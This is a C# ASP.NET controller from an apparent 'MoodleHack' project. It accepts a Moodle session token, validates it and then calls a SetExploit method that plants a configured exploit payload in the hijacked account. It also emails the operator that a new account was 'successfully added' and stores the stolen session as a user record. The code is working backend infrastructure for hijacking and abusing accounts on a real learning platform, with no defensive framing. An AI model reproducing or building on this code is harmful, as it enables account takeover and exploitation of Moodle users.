using System;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Configuration;
using MoodleHack.API.Services;
using MoodleHack.Domain.Entities;
using MoodleHack.Infrastructure.Data;

namespace MoodleHack.API.Controllers
{
    [Route("api/[controller]/[action]")]
    public class ManageController : ControllerBase
    {
        private readonly AppDbContext _appDbContext;
        private readonly EmailClient _emailClient;
        private readonly SdoApiClient _sdoApiClient;
        private readonly IConfiguration _configuration;

        public ManageController(AppDbContext appDbContext, 
            EmailClient emailClient,
            SdoApiClient sdoApiClient,
            IConfiguration configuration)
        {
            _appDbContext = appDbContext;
            _emailClient = emailClient;
            _sdoApiClient = sdoApiClient;
            _configuration = configuration;
        }
        //Limit 5 unsuccess queries
        [HttpGet]
        public async Task<IActionResult> AddLink([FromQuery] string moodleSession)
        {
            var proxyIp = HttpContext.Request.Headers["X-Real-IP"].ToString();
            var senderIp = string.IsNullOrEmpty(proxyIp) ? HttpContext?.Connection.RemoteIpAddress?.ToString() : proxyIp;
            var countUnsuccessQueries = _appDbContext.Requests.AsQueryable().Where(x => x.Ip == senderIp)
                .Count(x => !x.Success);
           
            if (countUnsuccessQueries > 15)
                return Ok();
            var result = await _sdoApiClient.Validate(moodleSession);
            if (result)
            {
                result = await _sdoApiClient.SetExploit(moodleSession, _configuration["EXPLOIT"]);
                if (!result)
                    _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, false, DateTime.Now));
                await _emailClient.SendMessage(_configuration["TOEMAIL"], "MoodleService",
                    "Успешно был добавлен новый аккаунт!");
                _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, true, DateTime.Now));
                _appDbContext.Users.Add(new UserAccountEntity(null, moodleSession, null, DateTime.Now, true));
            }
            else
            {
                _appDbContext.Requests.Add(new RequestEntity(senderIp, moodleSession, false, DateTime.Now));
            }

            await _appDbContext.SaveChangesAsync();
            return Ok();
        }
    }
}